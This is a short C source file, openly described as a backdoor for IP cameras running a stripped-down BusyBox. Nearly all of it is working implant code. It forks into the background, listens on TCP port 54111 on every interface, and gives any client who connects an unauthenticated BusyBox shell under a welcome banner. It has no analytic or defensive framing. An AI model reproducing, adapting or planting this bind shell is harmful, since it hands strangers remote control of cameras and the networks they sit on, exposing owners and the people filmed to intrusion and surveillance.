// tnabd_simple.c
// 
// Backdoor for Stripped down busybox install of IPC IP Camera 
// Use build_armv6_static.sh to compile
//

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define SERVER_PORT 54111

int main() {
	int serverfd, clientfd, server_pid, i = 0;
	char *banner = "[~] Welcome to IPC-Camera Bind Shell\n";
	char *args[] = { "/bin/busybox", "sh", (char *) 0 };
	struct sockaddr_in server, client;
	socklen_t len;
	int x = fork();
	if (x == 0){
		server.sin_family = AF_INET;
		server.sin_port = htons(SERVER_PORT);
		server.sin_addr.s_addr = INADDR_ANY;
		serverfd = socket(AF_INET, SOCK_STREAM, 0);
		bind(serverfd, (struct sockaddr *)&server, sizeof(server));
		listen(serverfd, 1);
		while (1) {
			len = sizeof(struct sockaddr);
			clientfd = accept(serverfd, (struct sockaddr *)&client, &len);
			server_pid = fork();
			if (server_pid) {
				write(clientfd, banner, strlen(banner));
				for(; i <3 /*u*/; i++) dup2(clientfd, i);
				execve("/bin/busybox", args, (char *) 0);
				close(clientfd);
			} close(clientfd);
		}
	}
	return 0;
}
